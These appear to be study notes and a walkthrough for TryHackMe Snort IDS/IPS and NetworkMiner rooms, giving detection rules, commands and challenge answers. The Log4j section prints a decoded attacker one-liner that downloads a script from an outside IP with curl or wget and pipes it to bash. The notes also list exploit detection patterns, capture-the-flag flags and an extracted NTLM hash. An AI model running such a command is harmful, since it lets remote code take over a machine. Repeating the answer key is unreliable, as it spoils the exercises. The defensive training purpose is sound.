Clear the previous log and alarm files.

`sudo rm snort.log* alert`

Deactivate/comment on the old rules.

Write a rule to detect failed FTP login attempts in the given pcap.

`alert tcp any any <> any any (msg: "Failed FTP login found"; content: "530 user"; sid:1000003; rev:1;)`

What is the number of detected packets?
- 41

Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect successful FTP logins in the given pcap.

`alert tcp any any <> any any (msg: "Successful FTP login found"; content: "230 User"; sid:1000004; rev:1;)`

What is the number of detected packets?
- 1

Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password.

`alert tcp any any <> any any (msg: "FTP Bad Password found"; content: "331 Password"; sid:1000005; rev:1;)`

What is the number of detected packets?
- 42

Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect failed FTP login attempts with "Administrator" username but a bad password or no password.

`alert tcp any any <> any any (msg: "FTP Bad Password found"; content: "Administrator"; content: "331 Password"; sid:1000006; rev:1;)`

What is the number of detected packets?
- 7

### _**Writing IDS Rules (PNG)**_

Write a rule to detect the PNG file in the given pcap.
- [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
- `alert tcp any any <> any any (msg: "PNG image found"; content: "|89 50 4E 47 0D 0A 1A 0A|"; sid:1000007; rev:1;)`
- `sudo snort -c ./local.rules -dev -l . -r ftp-png-gif.pcap `

Investigate the logs and identify the software name embedded in the packet.
- Adobe ImageRead

Clear the previous log and alarm files.

Deactivate/comment out the old rule.

Write a rule to detect the GIF file in the given pcap.
- `alert tcp any any <> any any (msg: "GIF87a image found"; content: "|47 49 46 38 37 61|"; sid:1000008; rev:1;)`
- `alert tcp any any <> any any (msg: "GIF89a image found"; content: "|47 49 46 38 39 61|"; sid:1000009; rev:1;)`

Investigate the logs and identify the image format embedded in the packet.
- `sudo snort -d -r snort.log.<number>`
- `less alert`
- GIF89a

### _**Writing IDS Rules (Torrent Metafile)**_

Write a rule to detect the torrent metafile in the given pcap.
- `alert tcp any any <> any any (msg: "Torrent found"; content: "torrent"; sid:1000010; rev:1;)`
- `sudo snort -c ./local.rules -dev -l . -r torrent.pcap`


 What is the number of detected packets?
 - 2

Investigate the log/alarm files.
- `sudo snort -d -r snort.log<number>`

What is the name of the torrent application?
- bittorrent

Investigate the log/alarm files.
- `sudo snort -d -r snort.log<number>`

What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
- application/x-bittorrent

Investigate the log/alarm files.
- `sudo snort -d -r snort.log<number>`

What is the hostname of the torrent metafile?
- tracker2.torrentbox.com

### _**Troubleshooting Rule Syntax Errors**_
You can test each ruleset with the following command structure;

`sudo snort -c local-X.rules -r mx-1.pcap -A console`

Fix the syntax error in local-1.rules file and make it work smoothly.  

`alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)`

What is the number of the detected packets?
- 16

Fix the syntax error in local-2.rules file and make it work smoothly.

`alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)`

What is the number of the detected packets?
- 68

Fix the syntax error in local-3.rules file and make it work smoothly.

`alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`

`alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)`

What is the number of the detected packets?
- 87

Fix the syntax error in local-4.rules file and make it work smoothly.

`alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`

`alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)`

What is the number of the detected packets?
- 90

Fix the syntax error in local-5.rules file and make it work smoothly.

`alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)`

`alert icmp any any <> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)`

`alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)`

What is the number of the detected packets?
- 155

Fix the logical error in local-6.rules file and make it work smoothly to create alerts.

`alert tcp any any <> any any (msg: "get request found"; content:"|67 65 74|";nocase ; sid:10000001; rev:1;)`

What is the number of the detected packets?
- 2

Fix the logical error in local-7.rules file and make it work smoothly to create alerts.

`alert tcp any any <> any 80  (msg: "alert found"; content:"|2E 68 74 6D 6C|"; sid:1000001; rev:1;)`

What is the name of the required option:
- msg

### _**Using External Rules (MS17-010)**_
Use the given pcap file.

Use the given rule file (local.rules) to investigate the ms1710 exploitation.

- 
```
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; sid: 2094284; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$"; sid:2094285; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "NTLMSSP";sid: 2094286; rev: 2;) 
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "WindowsPowerShell";sid: 20244223; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "ADMIN$";sid:20244224; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$";sid: 20244225; rev:3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 20244226; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 209462812; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "samr"; sid: 209462813; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "browser"; sid: 209462814; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established;content: "epmapper";sid: 209462815; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "eventlog"; sid: 209462816; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "/root/smbshare"; sid: 20242290; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "\\PIPE"; sid: 20242291; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "smbshare"; sid: 20242292; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "srvsvc"; sid: 20242293; rev: 2;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB3|00 00 00 00|"; depth:9; offset:4; byte_extract:2,26,TotalDataCount,relative,little; byte_test:2,>,TotalDataCount,20,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,blog.talosintelligence.com/2017/05/wannacry.html; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:41978; rev:5;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB|A0 00 00 00 00|"; depth:9; offset:4; content:"|01 00 00 00 00|"; within:5; distance:59; byte_test:4,>,0x8150,-33,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:42944; rev:2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; reference: ExploitDatabase (ID’s - 42030, 42031, 42315); priority: 10; sid: 2094284; rev: 2;)
```
- `sudo snort -c ./local.rules -dev -l . -r ms-17-010.pcap`

What is the number of detected packets?

- 25154

Clear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.

- `alert tcp any any <> any any (msg:"keyword found"; content:"\\IPC$"; sid:1000001; rev:1;)`
- `sudo snort -c ./local-1.rules -dev -l . -r ms-17-010.pcap`

What is the number of detected packets?

- 12

Investigate the log/alarm files.

- `sudo snort -d -r snort.log.<number>`

What is the requested path?

- \\\192.168.116.138\IPC$

What is the CVSS v2 score of the MS17-010 vulnerability?

- https://nvd.nist.gov/vuln/detail/cve-2017-0144
- 9.3

### _**Using External Rules (Log4j)**_

Use the given rule file (local.rules) to investigate the log4j exploitation.

```
alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:ldap://"; fast_pattern:only; flowbits:set, fox.apachelog4j.rce; priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003726; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; pcre:"/\$\{jndi\:(rmi|ldaps|dns)\:/"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003728; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; content:!"ldap://"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, twitter.com/stereotype32/status/1469313856229228544; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003730; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228)"; flow:established, to_server; content:"%7bjndi:"; nocase; fast_pattern; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003731; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header"; flow:established, to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003732; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI"; flow:established,to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003733; rev:1;) 

# Better and stricter rules, also detects evasion techniques
alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header (strict)"; flow:established,to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Hi"; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003734; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI (strict)"; flow:established, to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Ui"; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003735; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in Client Body (strict)"; flow:to_server; content:"${"; http_client_body; fast_pattern; content:"}"; http_client_body; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Pi"; flowbits:set, fox.apachelog4j.rce.strict; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-12; metadata:ids suricata; priority:3; sid:21003744; rev:1;)


```
- `sudo snort -c ./local.rules -dev -l . -r log4j.pcap`
What is the number of detected packets?

- 26

Investigate the log/alarm files.

- `less alert`
- `egrep "1:210037*" alert | sort -u`

How many rules were triggered?.

- 4

Investigate the log/alarm files.

What are the first six digits of the triggered rule sids?

- 210037

Clear the previous log and alarm files.

- `sudo rm alert snort.log.<number>`

Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.

- `alert tcp any any <> any any (msg:"Abnormal packet size detected"; dsize:770<>855; sid:1000001; rev:1)`
- `sudo snort -c local-1.rules -dev -l . -r log4j.pcap`

What is the number of detected packets?

- 41

Investigate the log/alarm files.

- `sudo snort -r snort.log.<number> -d`

What is the name of the used encoding algorithm?

- Base64

Investigate the log/alarm files.
- 

What is the IP ID of the corresponding packet?

- 62808

Investigate the log/alarm files.

- KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=}

Decode the encoded command.

- save base64 to decode.txt
- `base64 -d decode.txt`

What is the attacker's command?

- (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash

What is the CVSS v2 score of the Log4j vulnerability?

- [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- 9.3

### _**Conclusion**_
Congratulations! Are you brave enough to stop a live attack in the [Snort2 Challenge 2](https://tryhackme.com/room/snortchallenges2) room?

## **--Snort Challenge - Live Attacks--**

### _**Introduction**_
The room invites you to a challenge where you will investigate a series of traffic data and stop malicious activity under two different scenarios. Let's start working with Snort to analyse live and captured traffic.

### _**Scenario 1 | Brute-Force**_

Start Snort in sniffer mode and try to figure out the attack source, service and port.  
  

Then, write an IPS rule and run Snort in IPS mode to stop the brute-force attack. Once you stop the attack properly, you will have the flag on the desktop!

Here are a few points to remember:

- Create the rule and test it with "-A console" mode. 
- Use **"-A full"** mode and the **default log path** to stop the attack.
- Write the correct rule and run the Snort in IPS "-A full" mode.
- Block the traffic at least for a minute and then the flag file will appear on your desktop.  
    

Stop the attack and get the flag (which will appear on your Desktop)

- `sudo snort -dev -l .`
- `ctrl c`
- `sudo snort -r snort.log.<number>`
- `sudo snort -r snort.log.<number> 'port 22' -n 10`
- `sudo snort -r snort.log.<number> 'port 80' -n 10`
- `sudo nano /etc/snort/rules/local.rules`
- `drop tcp any 22 <> any any (msg: "SSH Brute Force Found"; sid: 1000001; rev:1;)`
- `sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full`
- `THM{81b7fef657f8aaa6e4e200d616738254}`

What is the name of the service under attack?

- ssh

What is the used protocol/port in the attack?

- tcp/22

### _**Scenario 2 | Reverse-Shell**_

start Snort in sniffer mode and try to figure out the attack source, service and port.  
  

Then, write an IPS rule and run Snort in IPS mode to stop the brute-force attack. Once you stop the attack properly, you will have the flag on the desktop!

Here are a few points to remember:

- Create the rule and test it with "-A console" mode. 
- Use "-A full" mode and the default log path to stop the attack.
- Write the correct rule and run the Snort in IPS "-A full" mode.
- Block the traffic at least for a minute and then the flag file will appear on your desktop.

Stop the attack and get the flag (which will appear on your Desktop)

- `sudo snort -dev -l .`
- `ctrl c`
- `sudo snort -r snort.log.<number>`
- `sudo snort -r snort.log.<number> 'port 4444' -n 10`
- `sudo nano /etc/snort/rules/local.rules`
- `drop tcp any 4444 <> any any (msg: "Reverse Shell Found"; sid: 1000001; rev:1;)`
- `sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full`
- `THM{0ead8c494861079b1b74ec2380d2cd24}`

What is the used protocol/port in the attack?

- tcp/4444

Which tool is highly associated with this specific port number?

- Metasploit

## **--NetworkMiner--**

### _**Introduciton**_

NetworkMiner is an open-source traffic sniffer, pcap handler and protocol analyser. Developed and still maintained by Netresec.  

[The official description](https://www.netresec.com/?page=NetworkMiner)

### _**Introduction to Network Forensics**_

Network Forensics is a specific subdomain of the Forensics domain, and it focuses on network traffic investigation. Network Forensics discipline covers the work done to access information transmitted by listening and investigating live and recorded traffic, gathering evidence/artefacts and understanding potential problems.   
  

Briefly, it is the action of recording packets of network traffic and creating investigatable sources and establishing a root–cause analysis of an event. The ultimate goal is to provide sufficient information to detect malicious activities, security breaches, policy/regulation compliance, system health and user behaviour.

  

The investigation process identifies communicated hosts in terms of time, frequency, protocol, application and data.

  

The investigation tries to answer the **5W**;

  

- Who (Source IP and port)
- What (Data/payload)
- Where (Destination IP and port)
- When (Time and data)
- Why (How/What happened)  
    

**Note that** the network evidence capture and investigation process should be systematic. Having enough data and the right timeline capture for a successful network forensics investigation is crucial.  

  

**Network Forensics Use Cases**  

  

The most common network forensics use cases are explained below;

  

- **Network discovery:** Discovering the network to overview connected devices, rogue hosts and network load.   
      
    
- **Packets reassembling:** Reassembling the packets to investigate the traffic flow. This use case is helpful in unencrypted traffic flows.  
      
    
- **Data leakage detection:** Reviewing packet transfer rates for each host and destination address helps detect possible data leakage.   
      
    
- **Anomaly and malicious activity detection:** Reviewing overall network load by focusing on used ports, source and destination addresses, and data helps detect possible malicious activities along with vulnerabilities. This use case covers the correlation of indicators and hypotheses as well.  
      
    
- **Policy/Regulation compliance control:** Reviewing overall network behaviour helps detect policy/regulation compliance.  
      
    

**Advantages of Network Forensics**   

  

General advantages of network forensics are explained below;

  

- **Availability of network-based evidence in the wild:** Capturing network traffic is collecting evidence, so it is easier than other types of evidence collections such as logs and IOCs.

- **Ease of data/evidence collection without creating noise:** Capturing and working with network traffic is easier than investigating unfiltered events by EDRs, EPPs and log systems. Usually, sniffing doesn't create much noise, logs and alerts. The other thing is that network traffic is not destructible like logs and alerts generated by security systems.  

- **It is hard to destroy the network evidence, as it is the transferred data:** Since the evidence is the traffic itself, it is impossible to do anything without creating network noise. Still, it is possible to hide the artefacts by encrypting, tunnelling and manipulating the packets. So, the second fact is the challenge of this advantage. 

- **Availability of log sources:** Logs provide valuable information which helps to correlate the chain of events and support the investigation hypothesis. The majority of the EDRs, EPPs and network devices create logs by default. Having log files is easy if the attacker/threat/malware didn't erase/destroy them.

- **It is possible to gather evidence for memory and non-residential malicious activities:** The malware/threat might reside in the memory to avoid detection. However, the series of commands and connections live in the network. So it is possible to detect non-residential threats with network forensics tools and tactics.

**Challenges of Network Forensics**  

  

General challenges of the network forensics are explained below;

  

- **Deciding what to do:** One of the most difficult challenges of network forensics is "Deciding what to do". There are several purposes of carving networks; SOC, IH/IR and Threat Hunting. Observing, trapping, catching, or stopping an anomalous activity is also possible. 

- **Sufficient data/evidence collection on the network:** One of the advantages of network forensics is "Ease of collecting evidence". However, the breadth of this concept poses a challenge. There are multiple points to consider in data/evidence collection.  
      
    
- **Short data capture:** One of the challenges in data/evidence collection. Capturing all network activity is not applicable and operable. So, it is hard always to have the packet captures that covers pre, during and post-event. 

- **The unavailability of full-packet capture on suspicious events:** Continuously capturing, storing and processing full-packets costs time and resources. The inability to have full-packet captures for a long time creates time gaps between captures, resulting in missing a significant part of an event of interest. Sometimes NetFlow captures are used instead of full-packet captures to reduce the weight of having full-packet captures and increase the capture time. Note that full-packet captures provide full packet details and give the opportunity of event reconstruction, while NetFlow provides high-level summary but not data/payload details.

- **Encrypted traffic:** Encrypted data is another challenge of network forensics. In most cases, discovering the contents of the encrypted data is not possible. However, the encrypted data still can provide valuable information for the hypothesis like source and destination address and used services.

- **GDPR and Privacy concerns in traffic recording:** Capturing the traffic is the same as "recording everything on the wire"; therefore, this act should comply with GDPR and business-specific regulations (e.g. HIPAA, PCI DSS and FISMA ).

- **Nonstandard port usage:** One of the popular approaches in network forensics investigations is grabbing the low-hanging fruits in the first investigation step. Looking for commonly used patterns (like known ports and services used in enumeration and exploitation) is known as grabbing the low-hanging fruits. However, sometimes attackers/threats use nonstandard ports and services to avoid detection and bypass security mechanisms. Therefore sometimes, this ends up as a challenge of network forensics.

- **Time zone issues:** Using a common time zone is important for big-scale event investigation. Especially when working with multiple resources over different time zones, usage of different time zones create difficulties in event correlation.

- **Lack of logs:** Network forensics is not limited to investigating the network traffic data. Network devices and event logs are crucial in event correlation and investigation hypotheses. This fact is known by the attackers/threats as well; therefore these logs are often erased by them, in order to make the investigation more difficult.

  

Sources of Network Forensics Evidence  

  

Capturing proper network traffic requires knowledge and tools. Usually, there is a single chance of gathering the live traffic as evidence. There are multiple evidence resources to gather network forensics data.  

  

- TAPS
- InLine Devices
- SPAN Ports
- Hubs
- Switches
- Routers
- DHCP Servers
- Name Servers
- Authentication Servers
- Firewalls
- Web Proxies
- Central Log Servers
- Logs (IDS/IPS, Application, OS, Device)  
      
    

**Primary Purposes of Network Forensics**   

  

There are two primary purposes in Network Forensics investigations.

- **Security Operations (SOC):** Daily security monitoring activities on system performance and health, user behaviour, and security issues.

- **Incident Handling/Response and Threat Hunting:** During/Post-incident investigation activities on understanding the reason for the incident, detecting malicious and suspicious activity, and investigating the data flow content.

**Investigated Data Types in Network Forensics**

  

There are three main data types investigated in Network Forensics

- **Live Traffic**
- **Traffic Captures (full packet captures and network flows)**
- **Log Files**  
    

NetworkMiner is capable of processing and handling packet pictures and live traffic. Therefore, we will focus on live and captured traffic in this room. Both of these data sources are valuable for forensics investigations. 

  

Traffic investigation actions fall under network forensics's "Traffic Analysis" subdomain. However, the main purpose of the NetworkMiner is to investigate the overall flow/condition of the limited amount of traffic, not for a long in-depth live traffic investigation. Therefore we will focus on how to use NetworkMiner for this purpose. In-depth traffic and packet analysis will be covered in the rooms below;  
  

- [Wireshark](https://tryhackme.com/room/wireshark)
- Tcpdump (available soon!)
- Tshark (available soon!)

### _**What is NetworkMiner?**_

NetworkMiner in a Nutshell

| Capability | Description |
| Traffic sniffing | It can intercept the traffic, sniff it, and collect and log packets that pass through the network. |
| Parsing PCAP files | It can parse pcap files and show the content of the packets in detail. |
| Protocol analysis | It can identify the used protocols from the parsed pcap file. |
| OS fingerprinting | It can identify the used OS by reading the pcap file. This feature strongly relies on [Satori](https://github.com/xnih/satori/) and [p0f](https://lcamtuf.coredump.cx/p0f3/). |
| File Extraction | It can extract images, HTML files and emails from the parsed pcap file. |
| Credential grabbing | It can extract credentials from the parsed pcap file. |
| Clear text keyword parsing | It can extract cleartext keywords and strings from the parsed pcap file. |
|

We are using NetworkMiner free edition in this room, but a Professional edition has much more features. You can see the differences between free and professional versions** [**here**](https://www.netresec.com/?page=NetworkMiner).

**Operating Modes**

There are two main operating modes;

- Sniffer Mode: Although it has a sniffing feature, it is not intended to use as a sniffer. The sniffier feature is available only on Windows. However, the rest of the features are available in Windows and Linux OS. Based on experience, the sniffing feature is not as reliable as other features. Therefore we suggest not using this tool as a primary sniffer. Even the official description of the tool mentions that this tool is a "Network Forensics Analysis Tool", but it can be used as a "sniffer". In other words, it is a Network Forensic Analysis Tool with but has a sniffer feature, but it is not a dedicated sniffer like Wireshark and tcpdump. 

- Packet Parsing/Processing: NetworkMiner can parse traffic captures to have a quick overview and information on the investigated capture. This operation mode is mainly suggested to grab the "low hanging fruit" before diving into a deeper investigation.

**Pros and Cons** 

As mentioned in the previous task, NetworkMiner is mainly used to gain an overview of the network. Before starting to investigate traffic data, let's look at **the pros and cons of the NetworkMiner.**  

**Pros**

- OS fingerprinting
- Easy file extraction
- Credential grabbing
- Clear text keyword parsing
- Overall overview

**Cons**

- Not useful in active sniffing
- Not useful for large pcap investigation
- Limited filtering
- Not built for manual traffic investigation

**Differences Between Wireshark and NetworkMiner**

NetworkMiner and Wireshark have similar base features, but they separate in use purpose. Although main functions are identical, some of the features are much stronger for specific use cases.  

The best practice is to record the traffic for offline analysis, quickly overview the pcap with NetworkMiner and go deep with Wireshark for further investigation.

![](2023-01-08-09-40-44.png)

### _**Tool Overview 1**_

**File Menu**

The file menu helps you load a Pcap file or receive Pcap over IP. You can also drag and drop pcap files as well. 

NetworkMiner also can receive Pcaps over IP. This room suggests using NetworkMiner as an initial investigation tool for low hanging fruit grabbing and traffic overview. Therefore, we will skip receiving Pcaps over IP in this room. You can read on receiving Pcap over IP from [here](https://www.netresec.com/?page=Blog&month=2011-09&post=Pcap-over-IP-in-NetworkMiner) and [here](http://www.gavinhollinger.com/2016/10/pcap-over-ip-to-networkminer.html).

**Tools Menu**

The tools menu helps you clear the dashboard and remove the captured data. 

**Help Menu**

The help menu provides information on updates and the current version.

**Case Panel**

The case panel shows the list of the investigated pcap files. You can reload/refresh, view metadata details and remove loaded files from this panel.

Viewing metadata of loaded files;

**Hosts**

The "hosts" menu shows the identified hosts in the pcap file. This section provides information on;

- IP address
- MAC address
- OS type
- Open ports
- Sent/Received packets
- Incoming/Outgoing sessions
- Host details

OS fingerprinting uses the Satori GitHub repo and p0f, and the MAC address database uses the mac-ages GitHub repo.

You can sort the identified hosts by using the sort menu. You can change the colour of the hosts as well. Some of the features (OSINT lookup) are available only in premium mode. The right-click menu also helps you to copy the selected value.

**Sessions**

The session menu shows detected sessions in the pcap file. This section provides information on;

- Frame number
- Client and server address
- Source and destination port  
- Protocol
- Start time

You can search for keywords inside frames with the help of the filtering bar. It is possible to filter specific columns of the session menu as well. This menu accepts four types of inputs;  

- "ExactPhrase"
- "AllWords"
- "AnyWord"
- "RegExe"

**DNS**

The DNS menu shows DNS queries with details. This section provides information on;

- Frame number
- Timestamp
- Client and server
- Source and destination port 
- IP TTL
- DNS time
- Transaction ID and type
- DNS query and answer
- Alexa Top 1M

Some of the features (Alexa Top 1M) are available only in premium mode. The search bar is available here as well.

**Credentials**

The credentials menu shows extracted credentials and password [hashes](https://tryhackme.com/room/hashingcrypto101) from investigated pcaps. You can use [Hashcat](https://tryhackme.com/room/crackthehashlevel2) ([GitHub](https://github.com/hashcat/hashcat)) and [John the Ripper](https://tryhackme.com/room/johntheripper0) ([GitHub](https://github.com/openwall/john)) to decrypt extracted credentials. NetworkMiner can extract credentials including;  

- Kerberos hashes
- NTLM hashes
- RDP cookies
- HTTP cookies  
- HTTP requests
- IMAP
- FTP
- SMTP
- MS SQL

The right-click menu is helpful in this part as well. You can easily copy the username and password values.


**Questions**

Use mx-3.pcap

What is the total number of frames?
- Right click the file in the Case Panel and click show metadata
- 460

How many IP addresses use the same MAC address with host 145.253.2.203?
- On the Hosts tab expand the IP address 145.253.2.203 then expand the MAC
- 2 

How many packets were sent from host 65.208.228.223?
- On the Hosts tab expand the IP address
- 72

What is the name of the webserver banner under host 65.208.228.223?
- On the Hosts tab expand the IP address then expand the Host Details
- Apache

Use mx-4.pcap

What is the extracted username?
- On the Credentials tab look at the Username column
- #B\Administrator

What is the extracted password?
- Right click the second line and copy the password
- `$NETNTLMv2$#B$136B077D942D9A63$FBFF3C253926907AAAAD670A9037F2A5$01010000000000000094D71AE38CD60170A8D571127AE49E00000000020004003300420001001E003000310035003600360053002D00570049004E00310036002D004900520004001E0074006800720065006500620065006500730063006F002E0063006F006D0003003E003000310035003600360073002D00770069006E00310036002D00690072002E0074006800720065006500620065006500730063006F002E0063006F006D0005001E0074006800720065006500620065006500730063006F002E0063006F006D00070008000094D71AE38CD601060004000200000008003000300000000000000000000000003000009050B30CECBEBD73F501D6A2B88286851A6E84DDFAE1211D512A6A5A72594D340A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E00360036002E0033003600000000000000000000000000`

### _**Tool Overview 2**_

**Files**

The file menu shows extracted files from investigated pcaps. This section provides information on;

- Frame number
- Filename
- Extension
- Size
- Source and destination address
- Source and destination port
- Protocol
- Timestamp
- Reconstructed path
- Details

Some features (OSINT hash lookup and sample submission) are available only in premium mode. The search bar is available here as well. The right-click menu is helpful in this part as well. You can easily open files and folders and view the file details in-depth.

**Images**

The file menu shows extracted images from investigated pcaps. The right-click menu is helpful in this part as well. You can open files and zoom in & out easily.

Once you hover over the image, it shows the file's detailed information (source & destination address and file path).

**Parameters**

The file menu shows extracted parameters from investigated pcaps. This section provides information on;

